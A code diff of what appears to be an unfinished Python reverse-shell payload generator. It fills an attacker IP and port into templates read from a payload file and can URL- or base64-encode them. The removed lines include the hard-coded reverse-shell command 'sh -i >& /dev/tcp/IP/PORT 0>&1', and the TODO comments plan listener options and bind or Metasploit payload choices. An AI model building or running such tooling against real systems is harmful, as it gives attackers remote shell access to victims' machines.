@@ -1,6 +1,5 @@
-import fileinput
 import os
-import io
+import time
 import urllib.parse
 import base64
 
@@ -27,6 +26,8 @@ print('''
 IP_var = '10.10.10.10'
 PORT_var = '9001'
 
+user_in = 11
+
 
 #######################NOTES-STR#######################
 # PAYLOAD = input("What payload do you want to use: ")
@@ -44,26 +45,27 @@ def display_payload_options():
 
 # display_payload_options()
 
-
-# open the sample file used
 file = open('assets/payloads.txt')
-# read the content of the file opened
-content = file.readlines()
-# print(content[0])
+payloads = file.readlines()
+# print(payloads[0])
 
 
-def display_actual():
+
+def display_one():
   kilo = open('assets/payloads.txt')
   content1 = kilo.readlines()
   f = open("assets/current-payload.txt", "x+")
   f = open('assets/current-payload.txt', 'w')
-  oscar = f.write("sh -i >& /dev/tcp/IP/PORT 0>&1")
-  # WORKS UNTIL THE ABOVE LINE ^^
-  print(content[0].replace('IP', IP_var))  # ---> This lie only replaces IP and doesn't replace PORT, some problem with & character.
-display_actual()
+  f.write(payloads[user_in].replace('IP', IP_var))
+display_one()
 
-# output = io.StringIO()
-# output.write(main())
+def display_actual():
+  file2 = open('assets/current-payload.txt')
+  print_payload = file2.readlines()
+  print(print_payload[0].replace('PORT', PORT_var))
+  file2.close()
+  os.remove('assets/current-payload.txt')
+display_actual()
 
 # This function is for urlencoding the payloads.
 def url_encode():
@@ -88,5 +90,3 @@ def base64_encode():
 # TODO: Work on listener options.
 # TODO: Work on how I can do most of this from single command in the terminal instead of throwing the user a whole bunch of fucking prompts once they run the tool.
 # TODO: ^^ Includes how to select Reverse, Bind or MSF and how to select a particular payload they want(inside the sections in the revhsells website).
-# TODO: For def main() https://www.w3resource.com/python-exercises/os/python-os-exercise-16.php memory buffer values.
-# TODO: Work on memory buffer thingy, see if it works and implement if it works.
